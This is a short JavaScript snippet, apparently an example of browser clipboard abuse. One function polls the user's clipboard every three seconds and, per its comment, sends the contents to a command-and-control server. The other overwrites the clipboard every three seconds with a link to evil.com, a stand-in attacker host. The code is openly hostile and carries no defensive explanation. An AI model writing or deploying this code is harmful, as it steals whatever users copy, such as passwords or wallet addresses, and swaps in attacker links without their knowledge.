function checkClipboard(){
  navigator.clipboard.readText().then(function(clipText){
    //send the clipText to C&C server
  });
}
setInterval(checkClipboard, 3000);

//or regularly update the clipboard content:
function updateClipboard(){
  navigator.clipboard.writeText("https://evil.com/buy?id=<some evil paramters>");
}
setInterval(updateClipboard, 3000);
